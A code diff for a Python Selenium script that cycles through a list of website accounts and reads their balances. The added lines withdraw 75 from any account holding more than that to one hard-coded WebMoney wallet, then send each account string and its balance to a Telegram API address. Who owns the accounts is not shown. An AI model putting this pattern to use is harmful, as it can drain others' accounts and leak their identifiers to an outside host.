@@ -73,10 +73,20 @@ def working():
         balance = driver.find_element_by_id("user_balance").text
         print(accounts[i] + "|" + balance)
         print(datetime.datetime.now())
-        # driver.get("https://api.telegram.org/"+accounts[i] + "|" + balance)
-        file = open("C:\\Users\\grove\\Desktop\\Scripts\\Smmok\\answ_"+time_+'.csv', 'a')
-        file.write(accounts[i]+"|"+balance+'\n')
-        file.close()
+        money = driver.find_element_by_id("user_balance").text
+        money = balance.split('.')
+        print(money)
+        if int(money[0]) > 75:
+            print("vohoo")
+            driver.find_element_by_class_name('color2').click()
+            driver.find_element_by_name('withdraw_sum').send_keys('75')
+            driver.find_element_by_name('withdraw_wmr').send_keys('Z792976401629')
+            driver.find_element_by_class_name('submitBtn').click()
+            time.sleep(120)
+        driver.get("https://api.telegram.org/&text="+accounts[i] + "|" + balance)
+        # file = open("C:\\Users\\grove\\Desktop\\Scripts\\Smmok\\answ_"+time_+'.csv', 'a')
+        # file.write(accounts[i]+"|"+balance+'\n')
+        # file.close()
         if j == len(accounts) - 1:
             i = 0
             j = 1
